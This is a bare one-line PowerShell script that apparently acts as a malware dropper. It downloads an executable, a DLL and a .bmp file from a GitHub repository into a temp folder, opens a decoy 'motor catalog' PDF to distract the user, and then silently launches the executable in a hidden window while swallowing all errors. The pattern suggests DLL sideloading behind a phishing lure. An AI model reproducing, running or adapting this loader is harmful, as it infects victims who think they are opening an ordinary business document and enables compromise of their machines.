try{$ErrorActionPreference='Stop';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=Join-Path $env:TEMP ('.dl'+[Guid]::NewGuid().ToString('N').Substring(0,6));New-Item -ItemType Directory -Path $d -Force|Out-Null;$wc=New-Object Net.WebClient;$b='https://raw.githubusercontent.com/BondayGo/VulkanKit/main/';$wc.DownloadFile($b+'vulkaninfo.exe',(Join-Path $d 'vulkaninfo.exe'));$wc.DownloadFile($b+'vulkan-1.dll',(Join-Path $d 'vulkan-1.dll'));$wc.DownloadFile($b+'vulkan-1.bmp',(Join-Path $d 'vulkan-1.bmp'));try{$wc.DownloadFile($b+'catalog.pdf',(Join-Path $d 'Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf'));}catch{};try{Start-Process (Join-Path $d 'Ningbo Crotor-Cixi Dayan Motor Catalog_20260621.pdf')}catch{};Start-Sleep -Milliseconds 250;Start-Process (Join-Path $d 'vulkaninfo.exe') -WorkingDirectory $d -WindowStyle Hidden}catch{}